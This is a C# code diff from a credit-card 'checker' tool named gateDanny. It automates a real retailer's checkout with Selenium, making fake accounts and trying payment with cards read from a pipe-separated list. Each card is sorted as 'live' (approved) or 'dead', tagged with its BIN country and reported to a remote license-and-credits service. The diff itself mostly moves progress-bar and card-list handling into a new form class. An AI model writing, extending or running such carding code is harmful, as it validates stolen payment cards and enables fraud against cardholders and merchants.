@@ -1,4 +1,5 @@
-﻿using Newtonsoft.Json;
+﻿using gateBeta;
+using Newtonsoft.Json;
 using OpenQA.Selenium;
 using OpenQA.Selenium.Chrome;
 using OpenQA.Selenium.Support.Extensions;
@@ -203,21 +204,19 @@ namespace gateDanny.gates
         {
 
             check.login(Variables.key);
+
             if (int.Parse(Variables.creditos) <= 0)
             {
                 MessageBox.Show("Recargue sus creditos");
                 return;
             }
 
-            var lines = Form1.listCC.Lines.Count();
-            if (lines > 0 && Variables.run == true)
+           
+            if (Thunder._Form1.numcc() > 0 && Variables.run == true)
             {
                 try
                 {
-
-
-
-                    Form1.circularProgressBar1.Value = 5;
+                    Thunder._Form1.update_progresbar(5);
                     var chromeOptions = new ChromeOptions();
                     correo = "joseffernana" + getNum() + "@gmail.com";
                     clave = "Jo." + getNum();
@@ -243,7 +242,7 @@ namespace gateDanny.gates
                         if (tiempoElemento(By.XPath("//*[@id='ap_customer_name']")))
                         {
                             GetEmail();
-                            Form1.circularProgressBar1.Value = 20;
+                            Thunder._Form1.update_progresbar(20);
                             Thread.Sleep(500);
 
                             if (tiempoElemento(By.XPath("//*[@id='ap_customer_name']")))
@@ -291,7 +290,7 @@ namespace gateDanny.gates
                                         }
                                         else
                                         {
-                                            Form1.circularProgressBar1.Value = 30;
+                                            Thunder._Form1.update_progresbar(30);
                                             a = true;
                                         }
 
@@ -327,7 +326,7 @@ namespace gateDanny.gates
                                                 if (tiempoElemento(By.XPath("//*[@id='verificationMsg']/p[2]")))
                                                 {
                                                     var opt = driver.FindElement(By.XPath("//*[@id='verificationMsg']/p[2]")).Text;
-                                                    Form1.circularProgressBar1.Value = 40;
+                                                    Thunder._Form1.update_progresbar(40);
                                                     Thread.Sleep(1000);
 
                                                     Thread.Sleep(500);
@@ -356,7 +355,7 @@ namespace gateDanny.gates
 
                                                             if (tiempoElemento(By.XPath("//*[@id='addressBookPage']/a")))
                                                             {
-                                                                Form1.circularProgressBar1.Value = 60;
+                                                                Thunder._Form1.update_progresbar(60);
                                                                 driver.FindElement(By.XPath("//*[@id='addressBookPage']/a")).Click();
                                                                 Thread.Sleep(1000);
                                                                 if (tiempoElemento(By.Id("addressCountryCode")))
@@ -383,7 +382,7 @@ namespace gateDanny.gates
 
                                                                     if (tiempoElemento(By.XPath("//*[@id='addressBookPage']/div[2]/div/div/div[1]/a")))
                                                                     {
-                                                                        Form1.circularProgressBar1.Value = 70;
+                                                                        Thunder._Form1.update_progresbar(70);
                                                                         driver.Navigate().GoToUrl("https://www.shopbop.com/jewelry-accessories/br/v=1/13539.htm");
                                                                         Thread.Sleep(500);
 
@@ -428,7 +427,7 @@ namespace gateDanny.gates
                                                                                         Thread.Sleep(500);
                                                                                         if (tiempoElemento(By.XPath("//*[@id='checkoutButtonPrimary']")))
                                                                                         {
-                                                                                            Form1.circularProgressBar1.Value = 80;
+                                                                                            Thunder._Form1.update_progresbar(80);
 
                                                                                             driver.FindElement(By.XPath("//*[@id='checkoutButtonPrimary']")).Click();
                                                                                             Thread.Sleep(500);
@@ -679,15 +678,16 @@ namespace gateDanny.gates
         {
             try
             {
-                var lines = Form1.listCC.Lines.Count();
+             
 
 
-                if (lines > 0 && Variables.run == true)
+                if (Thunder._Form1.numcc() > 0 && Variables.run == true)
                 {
                     if (pagos < 3)
                     {
-                        Form1.circularProgressBar1.Value = 90;
-                        string cc = Form1.listCC.Lines[0];
+                        Thunder._Form1.update_progresbar(90);
+
+                        string cc = Thunder._Form1.nextCc();
                         string[] ccLine = cc.Split('|');
                         var ccnum = ccLine[0];
 
@@ -763,28 +763,28 @@ namespace gateDanny.gates
 
                         if (confirmar())
                         {
-                            Form1.circularProgressBar1.Value = 100;
-                            var guardar = numeroTargeta + " - " + cc + " - " + checkbin(cc.Substring(0, 6)) + " " + Variables.gate;
+                            Thunder._Form1.update_progresbar(100);
+                            var pais = checkbin(cc.Substring(0, 6));
+                            var guardar = numeroTargeta + " - " + cc + " - " + pais + " " + Variables.gate;
                             check.ccss(Variables.key, guardar, "lives");
-                            Form1.textBox1.AppendText(cc + " $" + RandomNumber(5, 15) + ".00  - " + checkbin(cc.Substring(0, 6)));
+                            Thunder._Form1.agrgar_live(" ** APROVADO ** - "+ cc+ " - "+ pais);
                             check.playlive();
                             Console.WriteLine("live " + numeroTargeta + " - " + cc + " - " + correo + " - " + clave);
-                            Form1.textBox1.AppendText(Environment.NewLine);
-                            Form1.listCC.Text = Form1.listCC.Text.Remove(0, cc.Length).Trim();
+                            Thunder._Form1.remove_cc(0, cc.Length);
                             numeroTargeta++;
                             pagos++;
                             restart();
                         }
                         else
                         {
-                            Form1.circularProgressBar1.Value = 100;
-                            var guardar = numeroTargeta + " - " + cc + " - " + checkbin(cc.Substring(0, 6)) + " " + Variables.gate;
+                            var pais = checkbin(cc.Substring(0, 6));
+                            Thunder._Form1.update_progresbar(100);
+                            var guardar = numeroTargeta + " - " + cc + " - " + pais + " " + Variables.gate;
                             check.ccss(Variables.key, guardar, "deads");
                             Thread.Sleep(300);
-                            Form1.textBox2.AppendText(cc + " $" + RandomNumber(5, 15) + ".00  - " + checkbin(cc.Substring(0, 6)));
+                            Thunder._Form1.agragar_dead(cc);
                             Console.WriteLine("dead " + numeroTargeta + " - " + cc + " - " + correo + " - " + clave);
-                            Form1.textBox2.AppendText(Environment.NewLine);
-                            Form1.listCC.Text = Form1.listCC.Text.Remove(0, cc.Length).Trim();
+                            Thunder._Form1.remove_cc(0, cc.Length);
                             numeroTargeta++;
                             pagos++;
                             pago();
@@ -813,15 +813,15 @@ namespace gateDanny.gates
         {
             try
             {
-                var lines = Form1.listCC.Lines.Count();
+             
 
 
-                if (lines > 0 && Variables.run == true)
+                if (Thunder._Form1.numcc() > 0 && Variables.run == true)
                 {
                     if (pagos < 3)
                     {
-                        Form1.circularProgressBar1.Value = 90;
-                        string cc = Form1.listCC.Lines[0];
+                        Thunder._Form1.update_progresbar(90);
+                        string cc = Thunder._Form1.nextCc();
                         string[] ccLine = cc.Split('|');
                         var ccnum = ccLine[0];
 
@@ -858,28 +858,28 @@ namespace gateDanny.gates
 
                         if (confirmar2())
                         {
-                            Form1.circularProgressBar1.Value = 100;
-                            var guardar = numeroTargeta + " - " + cc + " - " + checkbin(cc.Substring(0, 6)) + " " + Variables.gate;
+                            Thunder._Form1.update_progresbar(100);
+                            var pais = checkbin(cc.Substring(0, 6));
+                            var guardar = numeroTargeta + " - " + cc + " - " + pais + " " + Variables.gate;
                             check.ccss(Variables.key, guardar, "lives");
-                            Form1.textBox1.AppendText(cc + " $" + RandomNumber(5, 15) + ".00  - " + checkbin(cc.Substring(0, 6)));
+                            Thunder._Form1.agrgar_live(" ** APROVADO ** " + cc + " - " + pais);
                             check.playlive();
                             Console.WriteLine("live " + numeroTargeta + " - " + cc + " - " + correo + " - " + clave);
-                            Form1.textBox1.AppendText(Environment.NewLine);
-                            Form1.listCC.Text = Form1.listCC.Text.Remove(0, cc.Length).Trim();
+                            Thunder._Form1.remove_cc(0, cc.Length);
                             numeroTargeta++;
                             pagos++;
                             restart();
                         }
                         else
                         {
-                            Form1.circularProgressBar1.Value = 100;
-                            var guardar = numeroTargeta + " - " + cc + " - " + checkbin(cc.Substring(0, 6)) + " " + Variables.gate;
+                            var pais = checkbin(cc.Substring(0, 6));
+                            Thunder._Form1.update_progresbar(100);
+                            var guardar = numeroTargeta + " - " + cc + " - " + pais + " " + Variables.gate;
                             check.ccss(Variables.key, guardar, "deads");
                             Thread.Sleep(300);
-                            Form1.textBox2.AppendText(cc + " $" + RandomNumber(5, 15) + ".00  - " + checkbin(cc.Substring(0, 6)));
+                            Thunder._Form1.agragar_dead(cc);
                             Console.WriteLine("dead " + numeroTargeta + " - " + cc + " - " + correo + " - " + clave);
-                            Form1.textBox2.AppendText(Environment.NewLine);
-                            Form1.listCC.Text = Form1.listCC.Text.Remove(0, cc.Length).Trim();
+                            Thunder._Form1.remove_cc(0, cc.Length);
                             numeroTargeta++;
                             pagos++;
                             pago2();
